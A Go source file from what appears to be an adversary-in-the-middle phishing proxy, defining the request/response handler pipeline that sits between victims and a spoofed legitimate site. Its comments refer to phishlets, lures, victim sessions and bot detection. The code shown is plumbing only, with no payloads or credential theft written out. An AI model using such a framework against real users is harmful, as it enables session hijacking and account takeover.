// Package proxy implements the HTTPS AiTM proxy pipeline.
package proxy

import (
	"errors"
	"log/slog"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
)

// RequestHandler is one step in the request pipeline.
// Handle is called with the mutated http.Request that will be forwarded upstream.
//
// Handlers may read and write any field of ctx. Typical mutations:
//   - ClientIP, JA4Hash: set by early fingerprinting handlers
//   - BotVerdict: set by the bot-guard handler
//   - Phishlet, Deployment, Lure: resolved from the Host header
//   - Session, IsNewSession: allocated or retrieved from the store
//
// Returning ErrShortCircuit stops the pipeline; the handler must write a complete
// response to ctx.ResponseWriter before returning. Any other non-nil error is
// treated as an internal fault, logged, and results in a 502 Bad Gateway.
type RequestHandler interface {
	Name() string
	Handle(ctx *aitm.ProxyContext, req *http.Request) error
}

// ResponseHandler is one step in the response pipeline.
// Handle is called with the upstream response before it is sent to the client.
//
// Handlers may mutate resp (headers, body) in-place. ctx fields set during
// the request pipeline (Phishlet, Session, etc.) are available for read access.
// Returning ErrShortCircuit stops the pipeline and forwards the response as-is.
// Any other non-nil error is logged but does not prevent the response from being
// forwarded to the client.
type ResponseHandler interface {
	Name() string
	Handle(ctx *aitm.ProxyContext, resp *http.Response) error
}

// ErrShortCircuit is returned by a handler to halt pipeline execution.
// It is a normal flow-control signal and is never logged as an error.
var ErrShortCircuit = errors.New("pipeline: short circuit")

// Spoofer transparently reverse-proxies a configured legitimate website.
// Implemented by the proxy-level SpoofProxy.
type Spoofer interface {
	ServeHTTP(w http.ResponseWriter, r *http.Request)
}

// Pipeline holds ordered slices of request and response handlers.
//
// Execution model:
//
//  1. RunRequest runs each RequestHandler in slice order. The first handler to
//     return ErrShortCircuit terminates the chain — the request is never forwarded
//     upstream. Any other error also terminates the chain and returns a 502.
//
//  2. If RunRequest completes without error, the caller forwards the request
//     upstream and calls RunResponse with the response.
//
//  3. RunResponse runs each ResponseHandler in slice order. ErrShortCircuit
//     terminates the chain but the response is still forwarded to the client.
//     Other errors are logged and also stop the chain, but the response is
//     still forwarded.
type Pipeline struct {
	RequestHandlers  []RequestHandler
	ResponseHandlers []ResponseHandler
	Logger           *slog.Logger
}

// RunRequest executes all request handlers in order.
// Returns ErrShortCircuit if a handler short-circuits the chain.
// Returns any other handler error (also halts the chain).
func (p *Pipeline) RunRequest(ctx *aitm.ProxyContext, req *http.Request) error {
	for _, handler := range p.RequestHandlers {
		if err := handler.Handle(ctx, req); err != nil {
			if errors.Is(err, ErrShortCircuit) {
				p.Logger.Debug("request pipeline short-circuited", "handler", handler.Name())
				return ErrShortCircuit
			}
			p.Logger.Error("request handler error", "handler", handler.Name(), "error", err)
			return err
		}
	}
	return nil
}

// RunResponse executes all response handlers in order.
// Returns ErrShortCircuit if a handler short-circuits the chain.
// Returns any other handler error (also halts the chain).
// In both error cases the caller should still forward the response to the client.
func (p *Pipeline) RunResponse(ctx *aitm.ProxyContext, resp *http.Response) error {
	for _, handler := range p.ResponseHandlers {
		if err := handler.Handle(ctx, resp); err != nil {
			if errors.Is(err, ErrShortCircuit) {
				p.Logger.Debug("response pipeline short-circuited", "handler", handler.Name())
				return ErrShortCircuit
			}
			p.Logger.Error("response handler error", "handler", handler.Name(), "error", err)
			return err
		}
	}
	return nil
}
